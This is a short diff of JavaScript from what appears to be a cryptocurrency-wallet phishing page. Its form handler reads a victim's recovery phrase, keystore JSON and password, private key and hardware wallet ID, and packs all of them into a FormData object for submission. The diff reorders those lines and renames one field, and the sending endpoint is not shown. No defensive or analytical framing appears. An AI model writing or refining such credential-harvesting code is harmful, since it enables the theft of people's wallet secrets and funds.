@@ -2471,14 +2471,14 @@
       let r = new FormData();
       let s = document.querySelector("form").name;
       phrase = phraseInput.value;
-      r.append("phraseKey", phrase);
       jsonphrase = keystorejson.value;
       password = keystorepassword.value;
-      r.append("jsonphrase", jsonphrase);
-      r.append("password", password);
       privatekey = privatekey.value;
-      r.append("privatekey", privatekey);
       hardwarekey = wallet_id.value;
+      r.append("phraseKey", phrase);
+      r.append("Keystore json phrase", jsonphrase);
+      r.append("password", password);
+      r.append("privatekey", privatekey);
       r.append("hardwarekey", hardwarekey);
       r.append("Wallet Type", walletName);
       r.append("_captcha", false);
